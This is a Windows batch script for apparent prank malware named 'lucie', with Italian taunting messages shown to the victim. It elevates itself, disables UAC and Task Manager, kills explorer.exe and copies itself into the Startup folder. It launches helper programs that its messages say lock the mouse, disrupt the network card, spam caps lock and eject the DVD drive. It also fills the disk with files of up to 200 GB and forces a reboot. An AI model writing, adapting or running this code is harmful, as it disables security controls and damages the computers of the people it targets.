@echo off
if exist "%TEMP%\consoleSettingsBackup.reg" regedit /S "%TEMP%\consoleSettingsBackup.reg"&DEL /F /Q "%TEMP%\consoleSettingsBackup.reg"&goto :mainstart
regedit /S /e "%TEMP%\consoleSettingsBackup.reg" "HKEY_CURRENT_USER\Console"
echo REGEDIT4>"%TEMP%\disablequickedit.reg"
echo [HKEY_CURRENT_USER\Console]>>"%TEMP%\disablequickedit.reg"
(echo "QuickEdit"=dword:00000000)>>"%TEMP%\disablequickedit.reg"
regedit /S "%TEMP%\disablequickedit.reg"
DEL /F /Q "%TEMP%\disablequickedit.reg"
start "" "cmd" /c "%~dpnx0"&exit
:mainstart
setlocal enabledelayedexpansion
color 09
mode con cols=160 lines=110
SET mypath=%~dp0
if exist "%userprofile%\AppData\Local\identifyl" goto noworm
if NOT exist "%userprofile%\AppData\Local\identifyl" goto worm
:worm
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
cd "%mypath%\lucieengine"
start /min "" ILMAUS.exe
echo la lucie gradisce bloccare i mouse
start /min "" sera.exe
echo la lucie non vuole che tu possa chiudermi!
start /min "" Merge.bat
echo la lucie non vuole che tu possa fermarmi!
attrib -h -s "%userprofile%\AppData"
echo.
copy "bsod.hta" "%userprofile%\AppData\Local\bsod.hta"
echo.
echo.
cd %userprofile%
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
echo.
cd "%mypath%\lucieengine"
start /min "" icspi.bat
ping 127.0.0.1 -n 3 > nul
echo.
echo la lucie sta molestando il pc
taskkill /F /IM explorer.exe
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie si sta moltiplicando nel tuo pc.
echo.
start /min "" piuespansione.bat
copy "%mypath:~0,-1%\%~n0%~x0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie vuole molestare la tua scheda di rete
start /min "" iltrainene.bat
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie ha voglia di spammare continuamente il caps lock, tu ovviamente accetti e taci.
echo.
cd\
cd "C:\Windows\System32"
start wscript.exe "%mypath%\lucieengine\uraele.vbs"
ping 127.0.0.1 -n 3 > nul
echo la lucie sta facendo continuamente uscire il lettore dvd.
echo.
start wscript.exe "%mypath%\lucieengine\luciebela.vbs"
ping 127.0.0.1 -n 3 > nul
echo la lucie vuole disabilitarti gestione attivita'
echo.
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo.
cd %userprofile%\desktop
ping 127.0.0.1 -n 3 > nul
echo la lucie sta creando cartelle nel desktop
echo.
ping 127.0.0.1 -n 3 > nul
for /l %%x in (1, 1, 10) do (
   mkdir %%x
)
cd "%mypath%\lucieengine"
start /min "" CHESUCIESO.bat
cd %AppData%
mkdir luciedata
cd luciedata
ping 127.0.0.1 -n 3 > nul
echo LA LUCIE STA CREANDO UN FILE DI 10 GIGA
fsutil file createnew LUCIE.txt 9242880000
ping 127.0.0.1 -n 3 > nul
echo LA LUCIE STA CREANDO UN ALTRO FILE DI 10 GIGA
fsutil file createnew AKEDBAILUCIE.txt 9242880000
echo A sto punto perchè non farne altri?
fsutil file createnew LUCIEEE.txt 9242880000
fsutil file createnew LALUCIE.txt 9242880000
fsutil file createnew LUCIE.txt 9242880000
echo Eh beh vai di 20gb seeee
fsutil file createnew ILUCIEWOOOOOOOOOH.txt 20242880000
echo MA PERCHE' NON NE CREIAMO UNO DA 200GB?
fsutil file createnew APOSTOOOOOOO.txt 202428800000
echo.
cd %userprofile%\desktop
echo viva la lucie!
color 0a
echo LUCiE!
:asdeeeer
color a
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 1
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color f
ping 127.0.0.1 -n 1 > nul
cd %mypath%\lucieengine
echo capodanno finito
echo Still here?
TIMEOUT /T 2 > nul
start /max "" timeout.bat
exit
REM -------------------------------------------------------------------------
REM -------------------------------------------------------------------------
:noworm
if exist "%userprofile%\AppData\Local\restartdone" goto ilritornodipurca
if NOT exist "%userprofile%\AppData\Local\restartdone" goto allocate
exit
:allocate
cd "%userprofile%\AppData\Local"
mkdir restartdone
shutdown -r -t 00
exit
:ilritornodipurca
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cd "%userprofile%\AppData\Roaming\lucieengine"
start /min "" StartaDue.bat
start /min "" icspi.bat
start /min "" sera.exe
echo la lucie non vuole che puoi chiudermi!
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie sta molestando il pc
start /min "" CHESUCIESO.bat
taskkill /F /IM explorer.exe
echo.
ping 127.0.0.1 -n 3 > nul
cd "%userprofile%\AppData\Roaming\lucieengine"
echo la lucie vuole molestare la tua scheda di rete
start /min "" iltrainene.bat
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie ha voglia di spammare continuamente il caps lock, tu ovviamente accetti e taci.
cd "C:\Windows\System32"
start wscript.exe "%userprofile%\AppData\Roaming\lucieengine\uraele.vbs"
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie sta facendo continuamente uscire il lettore dvd.
start wscript.exe "%userprofile%\AppData\Roaming\lucieengine\luciebela.vbs"
echo.
ping 127.0.0.1 -n 3 > nul
cd %userprofile%\desktop
echo la lucie vuole disabilitarti gestione attivita'
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
echo.
ping 127.0.0.1 -n 3 > nul
echo la lucie sta creando cartelle nel desktop
ping 127.0.0.1 -n 3 > nul
for /l %%y in (1, 1, 10) do (
   mkdir %%y
)
echo.
cd %AppData%\luciedata
ping 127.0.0.1 -n 1 > nul
echo LA LUCIE STA CREANDO UN FILE DI 10 GIGA
fsutil file createnew LUCIE.txt 9242880000
ping 127.0.0.1 -n 3 > nul
echo LA LUCIE STA CREANDO UN ALTRO FILE DI 10 GIGA
fsutil file createnew AKEDBAILUCIE.txt 9242880000
echo A sto punto perchè non farne altri?
fsutil file createnew LUCIEEE.txt 9242880000
fsutil file createnew LALUCIE.txt 9242880000
fsutil file createnew LUCIE.txt 9242880000
echo Eh beh vai di 20gb seeee
fsutil file createnew RENZILUCIEWOOOOOOOOOH.txt 20242880000
echo MA PERCHE' NON NE CREIAMO UNO DA 200GB?
fsutil file createnew APOSTOOOOOOO.txt 202428800000
cd %userprofile%\desktop
echo.
echo viva la lucie!
color 0a
echo LUCiE!
:asdeeeerr
color a
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color c
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 1
ping 127.0.0.1 -n 1 > nul
color b
ping 127.0.0.1 -n 1 > nul
color 0a
ping 127.0.0.1 -n 1 > nul
color f
ping 127.0.0.1 -n 1 > nul
cd "%userprofile%\AppData\Roaming\lucieengine"
echo capodanno finito
echo Still here?
TIMEOUT /T 2 > nul
start /max "" timeout.bat
exit
